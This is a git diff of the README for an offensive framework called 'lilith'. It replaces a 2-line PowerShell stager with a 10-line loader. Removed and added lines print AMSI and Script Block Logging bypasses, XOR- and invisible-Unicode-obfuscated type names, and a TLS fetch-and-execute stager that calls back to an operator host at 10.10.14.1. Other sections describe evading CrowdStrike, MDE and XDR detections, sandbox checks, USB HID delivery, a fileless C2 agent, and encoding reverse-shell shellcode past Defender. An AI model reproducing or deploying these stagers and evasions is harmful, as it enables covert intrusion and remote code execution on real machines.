@@ -119,7 +119,7 @@ python3 lilith.py build --byovd \
 - Script Block Logging bypass: `PSEtwLogProvider.m_enabled = 0` via reflection
 - COM CLR host mode (`--com-clr`) — P/Invokes `CorBindToRuntime` before `Assembly.Load`; different MDE event sequence than PS-hosted managed API
 - Native PE loader mode — custom in-memory PE mapper for non-.NET tools (avoids donut CLR COM bootstrap sequence)
-- All variable names randomised per build; all sensitive strings XOR-encoded (random key per build)
+- All variable names randomised per build; all sensitive strings XOR-encoded through a shared per-build key — including HTTP verbs (`GET`, `CONNECT`), the `ScriptBlock.Create` method name, field names (`amsiInitFailed`, `m_enabled`), stager URL, and User-Agent; no identifier or verb appears in plaintext
 - Invisible Unicode obfuscation — all sensitive .NET type-name strings (`System.Management.Automation.PSEtwLogProvider`, `AmsiUtils`, `ScriptBlock`, `Net.WebClient`, `Net.Sockets.TcpClient`, `Net.Security.SslStream`, `IO.MemoryStream`) seeded at random positions with invisible codepoints drawn from four categories: zero-width format chars (ZWSP U+200B, ZWNJ U+200C, ZWJ U+200D, WORD-JOINER U+2060), invisible math operators (U+2061–U+2063), Unicode variation selectors (U+FE00–U+FE02), and Private Use Area chars (U+E000–U+E002); `-replace "[^\x00-\x7F]",""` strips all of them at runtime before `New-Object` / `GetType()` resolution; AMSI byte-sequence patterns see a unique poisoned literal on every build and cannot match — a distinct evasion axis from XOR with no encoded byte arrays and no decoder scriptblock in source
 - SslStream for all stage downloads — no COM activation event (WinHTTP COM is a named IOC in CrowdStrike/MDE/XDR rulesets)
 - CDN-style URLs, Edge 124 User-Agent, full HTTP headers
@@ -185,13 +185,17 @@ python3 lilith.py build --all    # runner + encode all tools + generate all stag
 python3 lilith.py serve          # HTTPS server on :8443
 ```
 
-**Target — paste 2 lines (printed by `build --stager`):**
+**Target — paste 10 lines (printed by `build --stager` or `build --c2-stager`):**
 ```powershell
-# Line 1: AMSI bypass — inline, ~360 chars, values random per build
-$xk=71;[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString(([byte[]](2,40,...)|%{$_ -bxor $xk}))).GetField(([byte[]](48,...)|%{$_ -bxor $xk}),(121 -bxor $xk)).SetValue($null,$true)
-
-# Line 2: SslStream fetch + execute stager, ~1000 chars
-$k2=91;$u=([byte[]]@(...)|%{[char]($_ -bxor $k2)})-join'';$uri=[Uri]$u;$tc=New-Object Net.Sockets.TcpClient($uri.Host,$uri.Port);...;[scriptblock]::Create([Text.Encoding]::UTF8.GetString($ra,$hi,$ra.Length-$hi)).Invoke()
+# L01-L02: invisible-Unicode type-name setup (ZWSP/VS/PUA chars stripped at runtime)
+# L03:     shared XOR key + decoder scriptblock + AMSI bypass + SBL bypass
+# L04:     XOR-decode stager URL + URI parse
+# L05:     proxy detection via Net.WebClient
+# L06:     TCP connect (direct or via proxy)
+# L07:     CONNECT tunnel (proxy path only)
+# L08:     SslStream + TLS auth + GET request (verb XOR-encoded)
+# L09:     read response + strip HTTP headers + extract body
+# L10:     ScriptBlock via reflection (method name XOR-encoded) + invoke
 ```
 
 Tool output arrives in Terminal 1 as it lands.
@@ -274,16 +278,20 @@ python3 lilith.py build --stager SharpUp
 python3 lilith.py build --stagers         # all encoded tools at once
 ```
 
-`build --stager` prints the exact 2-line execution block for that tool:
+`build --stager` prints the exact 10-line execution block for that tool:
 
 ```
 [+] Stager : /home/user/.lilith/a3f8c1d2.ps1
     Mode   : runner PE (writes to %TEMP%)
     Token  : deadbeef1234abcd
     CB URL : https://10.10.14.1:8443/api/diagnostics/v1/telemetry/deadbeef1234abcd
-    Execute (2 lines):
-      $xk=71;[Ref].Assembly.GetType(...).GetField(...).SetValue($null,$true)
-      $k2=91;$u=(...)-join'';$uri=...;[scriptblock]::Create(...).Invoke()
+    Execute  (10 lines — paste one at a time or all at once):
+    ──── L01 ──────────────────────────────────────────────────────
+      $etw=("System.​Manag​ement.Autom⁣ation.PSEtwLogPr⁢ovider" -replace "[^\x00-\x7F]","");...
+    ──── L03 ──────────────────────────────────────────────────────
+      $k=83;$d={param($b)([byte[]]$b|%{[char]($_-bxor $k)})-join''};...bypass...
+    ──── L10 ──────────────────────────────────────────────────────
+      $sc=$asm.GetType($sbt).GetMethod((&$d @(...))).Invoke($null,@($body));& $sc
 ```
 
 > Filenames are randomised hex tokens — stagers, encoded payloads, and meta files never contain tool names in HTTP logs or on disk.
@@ -322,22 +330,26 @@ Serves all files from `~/.lilith/` over HTTPS with IIS headers and Schannel-mimi
 
 ## Step 7 — Execute on target
 
-Paste **one line at a time** — not as a block.
+Paste lines one at a time, or all at once — each line is a self-contained PS statement.
 
 ### From Evil-WinRM or any PowerShell session
 
-Run the exact 2 lines printed by `build --stager`. Values are random per build:
+Run the exact 10 lines printed by `build --stager`. Values are random per build:
 
-```powershell
-# Line 1 — paste and Enter
-$xk=71;[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString(([byte[]](2,40,34,...)|%{$_ -bxor $xk}))).GetField([Text.Encoding]::ASCII.GetString(([byte[]](48,60,...)|%{$_ -bxor $xk})),(121 -bxor $xk)).SetValue($null,$true)
-
-# Line 2 — paste and Enter
-$k2=91;$u=([byte[]]@(40,52,...)|%{[char]($_ -bxor $k2)})-join'';$uri=[Uri]$u;$tc=New-Object Net.Sockets.TcpClient($uri.Host,$uri.Port);$ss=New-Object Net.Security.SslStream($tc.GetStream(),$false,{$true});$ss.AuthenticateAsClient($uri.Host);...;[scriptblock]::Create([Text.Encoding]::UTF8.GetString($ra,$hi,$ra.Length-$hi)).Invoke()
+```
+──── L01 ─── invisible-Unicode setup (ETW, AMSI, WebClient, TcpClient type names)
+──── L02 ─── invisible-Unicode setup (SslStream, MemoryStream, ScriptBlock type names)
+──── L03 ─── shared XOR key + decoder + PSObject.Assembly ref + SBL bypass + AMSI bypass
+──── L04 ─── XOR-decode stager URL, parse URI components
+──── L05 ─── proxy detection via Net.WebClient + Windows integrated auth
+──── L06 ─── TCP connect to target (direct or via proxy)
+──── L07 ─── HTTP CONNECT tunnel (only runs when proxy detected)
+──── L08 ─── SslStream + TLS auth + GET request (verb XOR-decoded at runtime)
+──── L09 ─── read response, strip HTTP headers, extract PS1 body
+──── L10 ─── ScriptBlock via reflection (method name XOR-decoded) + invoke
 ```
 
-Line 1 (~360 chars): inline AMSI reflection bypass — no variable-per-chunk pattern, no chunked arrays.  
-Line 2 (~1000 chars): XOR-decodes the stager URL, opens a TLS connection via SslStream, strips HTTP headers, executes the stager as a scriptblock.
+All 10 lines can be pasted as a block — each ends cleanly. The first two lines contain invisible Unicode characters that are stripped at runtime; they look like whitespace or empty assignments to a casual observer.
 
 > **Why SslStream and not WinHTTP COM:** `WinHttp.WinHttpRequest.5.1` is an explicit named IOC in CrowdStrike Falcon, MDE, and Cortex XDR behavioral rulesets — the COM activation ProgID event alone is enough to flag the session. SslStream uses standard .NET TCP/TLS classes with no COM activation event.
 
@@ -346,13 +358,13 @@ Line 2 (~1000 chars): XOR-decodes the stager URL, opens a TLS connection via Ssl
 ```cmd
 powershell.exe -ep bypass
 ```
-Then paste the two lines above.
+Then paste the 10 lines above.
 
 ---
 
 ## USB HID delivery (`--usb`)
 
-Physical access scenario — plug in a device and walk away. Generates ready-to-flash keystroke payloads that open PowerShell and execute the 2-line loader automatically.
+Physical access scenario — plug in a device and walk away. Generates ready-to-flash keystroke payloads that open PowerShell and execute the stager automatically. The 10-line compact loader is split into 2 keyboard inputs: Line 1 (type-name setup + bypasses) and Line 2 (network fetch + execute).
 
 **Prerequisite:** build the stager first.
 
@@ -521,10 +533,11 @@ python3 lilith.py build --c2-stager    # generates fileless agent stager
 
 ### Deploy
 
-**Target — paste 2 lines printed by `build --c2-stager`:**
+**Target — paste 10 lines printed by `build --c2-stager`:**
 ```powershell
-# Line 1: AMSI bypass
-# Line 2: SslStream fetch + exec
+# L01-L02: invisible-Unicode type-name setup
+# L03:     XOR key + decoder + AMSI bypass + SBL bypass
+# L04-L10: URL decode, TLS fetch, ScriptBlock execute
 # Returns immediately — agent running in background of injected process
 ```
 
@@ -778,10 +791,10 @@ Place the `.exe` in `./windows/` or `./potatoes/` inside the project directory.
 - Confirm `lhost` in `engagement.yaml` is reachable from the target — rebuild stagers after changing it
 - Runner exits silently if sandbox checks trigger (uptime < 5 min, < 50 processes, hypervisor bit, RAM < 2 GB, hardware breakpoints, known analysis tools)
 
-**Line 2 times out / SslStream connection fails**
-- Confirm the target can reach your `lhost:http_port` over TCP
-- Confirm `lilith serve` is running
-- Try increasing `--usb-boot-delay` or `_PS_READY_MS` constant in `builders/usbhid.py` for slow targets
+**SslStream connection fails (L08 hangs or errors)**
+- Confirm the target can reach your `lhost:http_port` over TCP (`Test-NetConnection <lhost> -Port <port>`)
+- Confirm `lilith serve` is running and logging incoming GETs
+- For USB payloads: try increasing `--usb-boot-delay` or `_PS_READY_MS` in `builders/usbhid.py` for slow targets
 
 **GodPotato escalates but payload never runs**  
 Encode the shellcode: `msfvenom ... -e x64/xor_dynamic -i 5 -f raw`. Common `shell_reverse_tcp` stubs are caught in memory by Defender.
